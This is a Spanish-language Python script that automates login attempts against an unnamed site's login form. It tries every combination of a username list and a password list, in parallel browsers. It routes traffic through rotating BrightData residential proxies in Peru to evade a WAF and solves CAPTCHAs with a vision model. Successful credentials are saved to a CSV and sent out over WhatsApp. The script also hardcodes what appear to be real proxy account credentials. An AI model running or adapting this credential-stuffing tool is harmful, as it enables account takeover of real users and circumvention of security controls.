#!/usr/bin/env python3
"""
para ejecutar: python ejecutar.py
"""

import sys, os, csv, time, logging, json, threading
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# CONFIGURACIÓN DE RUTAS
# ============================================================
PROJECT_DIR = Path(__file__).parent
sys.path.insert(0, str(PROJECT_DIR))

from login_automation import LoginAutomation
from whatsapp_notifier import WhatsAppNotifier
from captcha_resolver import CaptchaResolver

DATA_DIR = PROJECT_DIR / "data"
SCREENSHOT_DIR = PROJECT_DIR / "screenshots"
LOGS_DIR = PROJECT_DIR / "logs"
ARCHIVO_USUARIOS = DATA_DIR / "usuarios.csv"
ARCHIVO_CONTRASENAS = DATA_DIR / "contraseñas.csv"
RESULTADOS_FILE = PROJECT_DIR / "resultados.json"
DEFAULT_THREADS = 5

# Crear directorios
LOGS_DIR.mkdir(parents=True, exist_ok=True)
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# ============================================================
# LOGGING
# ============================================================
log_file = LOGS_DIR / f"run_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

_print_lock = threading.Lock()
_results_lock = threading.Lock()
counters = {"total": 0, "ok": 0, "fail": 0, "waf": 0, "rotations": 0}

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-5s] [%(threadName)-12s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(str(log_file), encoding="utf-8")
    ]
)
logger = logging.getLogger("Bot")

# ============================================================
# CONFIGURACIÓN SUPERPROXY (BRIGHTDATA)
# ============================================================
SUPERPROXY_CONFIG = {
    "host": "brd.superproxy.io",
    "port": "44445",
    "customer": "brd-customer-hl_5bafdcb9",
    "zone": "zone-isp_proxy1",
    "password": "669zvtxm6e5h",
    "country": "pe",  # Perú
}

_session_counter = 0

def generate_session_id():
    """Genera un ID de sesión único (solo alfanumérico, requerido por BrightData)."""
    global _session_counter
    _session_counter += 1
    # BrightData solo acepta alfanuméricos en el session ID (sin guiones)
    return f"s{_session_counter}t{int(time.time())}"

def get_proxy_config(session_id=None):
    """
    Genera la configuración de proxy para BrightData.
    Las credenciales van en la URL del proxy para manejar autenticación.
    """
    cfg = SUPERPROXY_CONFIG
    if session_id is None:
        session_id = generate_session_id()
    
    # 🔥 CRUCIAL: Incluir -session-{ID} para IP de Perú
    username = f"{cfg['customer']}-{cfg['zone']}-country-{cfg['country']}-session-{session_id}"
    
    # URL del proxy con credenciales (Playwright acepta este formato)
    proxy_url = f"http://{username}:{cfg['password']}@{cfg['host']}:{cfg['port']}"
    
    return {
        "server": proxy_url,
        "username": username,
        "password": cfg['password'],
        "session_id": session_id,
        "ip": f"SuperProxy-{cfg['country'].upper()}-{session_id[:8]}"
    }

# ============================================================
# FUNCIONES AUXILIARES
# ============================================================

def sp(msg):
    """Safe print con lock."""
    with _print_lock:
        print(msg, flush=True)

def load_csv(fp):
    """Carga un archivo CSV con una columna."""
    if not fp.exists():
        return []
    vals = []
    with open(fp, "r", encoding="utf-8-sig") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                vals.append(line)
    return vals

# ============================================================
# WORKER: UN LOGIN POR HILO
# ============================================================

def worker(task, proxy_cfg, headless, captcha_res):
    """
    Ejecuta UN login en su propio navegador/hilo.
    """
    automation = LoginAutomation(screenshot_dir=str(SCREENSHOT_DIR), headless=headless)
    result = {
        "usuario": task["u"],
        "contrasena": task["p"],
        "procedencia": task["t"],
        "timestamp": datetime.now().isoformat(),
        "exito": False,
        "waf_blocked": False,
        "error": "",
        "screenshot": "",
        "ip": task.get("ip", ""),
    }
    try:
        automation.start_browser(proxy_config=proxy_cfg)
        lr = automation.attempt_login(
            usuario=task["u"],
            contraseña=task["p"],
            procedencia=task["t"],
            captcha_resolver=captcha_res.resolve if captcha_res else None,
        )
        result.update({
            "exito": lr.get("exito", False),
            "error": lr.get("error", ""),
            "screenshot": lr.get("screenshot", ""),
            "waf_blocked": lr.get("waf_blocked", False),
        })
    except Exception as e:
        result["error"] = str(e)
        # Si el error contiene 407, es problema de autenticación del proxy
        if "407" in str(e):
            result["waf_blocked"] = True
    finally:
        try:
            automation.close_browser()
        except:
            pass
    return result

# ============================================================
# EJECUTAR UN BATCH CON UNA SOLA IP
# ============================================================

def run_batch(tasks_batch, proxy_cfg, num_threads, headless, captcha_res, notifier, batch_num):
    """
    Ejecuta un batch de tareas con la MISMA IP usando N hilos.
    Retorna (results, waf_detected).
    Guarda logins correctos e incorrectos en sus respectivos archivos .csv en runtime.
    """
    ip_label = proxy_cfg.get("ip", "desconocida")
    session_id = proxy_cfg.get("session_id", "?")
    
    # Marcar cada tarea con la IP
    for t in tasks_batch:
        t["ip"] = ip_label

    sp(f"\n{'='*60}")
    sp(f"  BATCH #{batch_num} | {len(tasks_batch)} tareas | {num_threads} hilos")
    sp(f"  IP: {ip_label} (session: {session_id[:12]}...)")
    sp(f"{'='*60}")

    results = []
    waf_detected = False

    csv_lock = threading.Lock()
    file_correcto = DATA_DIR / "login_correcto.csv"
    file_incorrecto = DATA_DIR / "login_incorrecto.csv"

    # Inicializar archivos con cabecera si no existen
    for f_path in (file_correcto, file_incorrecto):
        if not f_path.exists():
            with open(f_path, "w", encoding="utf-8", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["fecha", "procedencia", "usuario", "contrasena", "ip", "error_info"])

    with ThreadPoolExecutor(max_workers=num_threads, thread_name_prefix=f"IP-{session_id[:6]}") as ex:
        futs = {ex.submit(worker, t, proxy_cfg, headless, captcha_res): t for t in tasks_batch}
        for fut in as_completed(futs, timeout=300):
            try:
                r = fut.result(timeout=300)
                results.append(r)
                
                # Clasificar e interactuar en CSV en runtime
                if r["waf_blocked"]:
                    waf_detected = True
                    with _results_lock:
                        counters["waf"] += 1
                        counters["fail"] += 1
                    sp(f"  [WAF] {r['procedencia']}/{r['usuario']} -> ROTANDO IP")
                    if notifier and notifier.bridge_process:
                        notifier.notify_error(
                            r["procedencia"], r["usuario"], r["contrasena"],
                            error=f"WAF 418 - IP {ip_label}", ip=ip_label
                        )
                elif r["exito"]:
                    with _results_lock:
                        counters["ok"] += 1
                    sp(f"  [OK]  {r['procedencia']}/{r['usuario']}")
                    
                    # Escribir en login_correcto.csv
                    with csv_lock:
                        with open(file_correcto, "a", encoding="utf-8", newline="") as f:
                            writer = csv.writer(f)
                            writer.writerow([
                                datetime.now().isoformat(), r["procedencia"], 
                                r["usuario"], r["contrasena"], r["ip"], ""
                            ])
                            
                    if notifier and notifier.bridge_process:
                        notifier.notify_login(
                            r["procedencia"], r["usuario"], r["contrasena"],
                            screenshot=r.get("screenshot"), ip=ip_label
                        )
                else:
                    with _results_lock:
                        counters["fail"] += 1
                    err_desc = r.get("error", "")
                    sp(f"  [X]   {r['procedencia']}/{r['usuario']} -> {err_desc[:50]}")
                    
                    # Si el error es por contraseña incorrecta o se detectó el error del XPath, es un login_incorrecto
                    # También si el error reporta explícitamente credencial inválida.
                    is_wrong_credentials = (
                        "contraseña incorrecta" in err_desc.lower() or 
                        "incorrecto" in err_desc.lower() or 
                        "claimVerificationServerError" in err_desc or
                        "autenticación" in err_desc.lower()
                    )
                    
                    if is_wrong_credentials:
                        # Escribir en login_incorrecto.csv
                        with csv_lock:
                            with open(file_incorrecto, "a", encoding="utf-8", newline="") as f:
                                writer = csv.writer(f)
                                writer.writerow([
                                    datetime.now().isoformat(), r["procedencia"], 
                                    r["usuario"], r["contrasena"], r["ip"], err_desc
                                ])
                        
                        # Enviar notificación WhatsApp para credenciales incorrectas
                        if notifier and notifier.bridge_process:
                            notifier.notify_error(
                                r["procedencia"], r["usuario"], r["contrasena"],
                                error=err_desc, ip=ip_label
                            )
                    
            except Exception as e:
                sp(f"  [ERR] -> {e}")

    return results, waf_detected

# ============================================================
# FUNCIÓN PRINCIPAL
# ============================================================

def main():
    print("""
============================================================
  LOGIN AUTOMATION — SUPERPROXY BRIGHTDATA
  IPs rotativas de Perú + N hilos/batch + WAF Blacklist
============================================================
    """)
    start_time = datetime.now()
    all_results = []

    # 1. CARGAR ARCHIVOS
    usuarios = load_csv(ARCHIVO_USUARIOS)
    contrasenas = load_csv(ARCHIVO_CONTRASENAS)
    
    if not usuarios or not contrasenas:
        print("❌ No hay usuarios o contrasenas.")
        print(f"   Usuarios: {ARCHIVO_USUARIOS}")
        print(f"   Contraseñas: {ARCHIVO_CONTRASENAS}")
        sys.exit(1)

    # Generar todas las tareas (usuario x contraseña x procedencia)
    all_tasks = []
    for u in usuarios:
        for c in contrasenas:
            for t in ["interno", "externo"]:
                all_tasks.append({"u": u, "p": c, "t": t})

    print(f"  Usuarios: {len(usuarios)} | Contrasenas: {len(contrasenas)} | Tareas: {len(all_tasks)}")

    # 2. CONFIGURAR HILOS POR IP
    th = input(f"\nHilos por IP (recomendado 5-10, default={DEFAULT_THREADS}): ").strip()
    num_threads = int(th) if th.isdigit() and int(th) > 0 else DEFAULT_THREADS
    num_threads = min(num_threads, 50)
    print(f"  Hilos por IP: {num_threads}")

    # 3. CONFIGURAR HEADLESS
    hl = input("Headless? (s/n, default=s): ").strip().lower()
    headless = hl != "n"
    print(f"  Headless: {headless}")

    # 4. CONFIGURAR CAPTCHA
    captcha_res = CaptchaResolver(method="vlm")

    # 5. CONFIGURAR WHATSAPP (Desactivado para la v1)
    notifier = WhatsAppNotifier(
        bridge_port=3456,
        whatsapp_module_dir=str(PROJECT_DIR),
    )
    # Ignorar prompt y establecer a inactivo
    wa = "n"

    # 6. CONFIRMAR
    print(f"\n{'='*50}")
    print(f"  Tareas: {len(all_tasks)} | Hilos/IP: {num_threads}")
    print(f"  Proxy: SUPERPROXY (BrightData) - País: {SUPERPROXY_CONFIG['country'].upper()}")
    print(f"  Headless: {headless} | WhatsApp: {'SI' if notifier.bridge_process else 'NO'}")
    print(f"{'='*50}")
    
    if input("Iniciar? (s/n, default=s): ").strip().lower() == "n":
        sys.exit(0)

    # 7. EJECUCIÓN
    sp(f"\n{'*'*50} INICIANDO {'*'*50}")

    task_idx = 0
    batch_num = 0

    try:
        while task_idx < len(all_tasks):
            # Generar nueva sesión (nueva IP)
            batch_num += 1
            proxy_cfg = get_proxy_config()
            
            # Tomar batch de tareas
            batch = all_tasks[task_idx:task_idx + num_threads]
            task_idx += len(batch)
            
            sp(f"\n🔄 NUEVA IP: {proxy_cfg['ip']} (batch #{batch_num})")
            
            # Ejecutar batch
            batch_results, waf = run_batch(
                batch, proxy_cfg, num_threads, headless, 
                captcha_res, notifier, batch_num
            )
            all_results.extend(batch_results)
            
            if waf:
                with _results_lock:
                    counters["rotations"] += 1
                sp(f"  ⚠️ WAF DETECTADO en batch #{batch_num}. Rotando IP para el siguiente...")
            
            time.sleep(2)  # Pausa entre batches

    except KeyboardInterrupt:
        sp("\n⏹️ Interrumpido por el usuario.")
    except Exception as e:
        logger.error(f"Error fatal: {e}", exc_info=True)

    # 8. GUARDAR RESULTADOS
    end = datetime.now()
    dur = str(end - start_time).split(".")[0]

    with open(RESULTADOS_FILE, "w", encoding="utf-8") as f:
        json.dump({
            "fecha": start_time.isoformat(),
            "duracion": dur,
            "total": counters["total"],
            "exitosos": counters["ok"],
            "fallidos": counters["fail"],
            "waf_blocks": counters["waf"],
            "rotaciones": counters["rotations"],
            "proxy": SUPERPROXY_CONFIG,
            "resultados": all_results,
        }, f, ensure_ascii=False, indent=2)

    # 9. RESUMEN FINAL
    sp(f"\n{'='*50} RESUMEN FINAL {'='*50}")
    sp(f"  Total:     {counters['total']}")
    sp(f"  Exitosos:  {counters['ok']}")
    sp(f"  Fallidos:  {counters['fail']}")
    sp(f"  WAF:       {counters['waf']}")
    sp(f"  Rotaciones: {counters['rotations']}")
    sp(f"  Duracion:  {dur}")
    sp(f"  Resultados: {RESULTADOS_FILE}")

    if counters["ok"] > 0:
        sp(f"\n✅ LOGINS EXITOSOS:")
        for r in all_results:
            if r.get("exito"):
                sp(f"  {r['procedencia']} // {r['usuario']} // {r['contrasena']} // IP: {r.get('ip','?')}")

    # 10. WHATSAPP
    if notifier.bridge_process:
        notifier.notify_summary(counters["total"], counters["ok"], counters["fail"], dur)
        sp("Resumen enviado por WhatsApp")
        if input("Detener WhatsApp? (s/n, default=s): ").strip().lower() != "n":
            notifier.stop_bridge()

    sp("✅ Proceso completado.")


if __name__ == "__main__":
    main()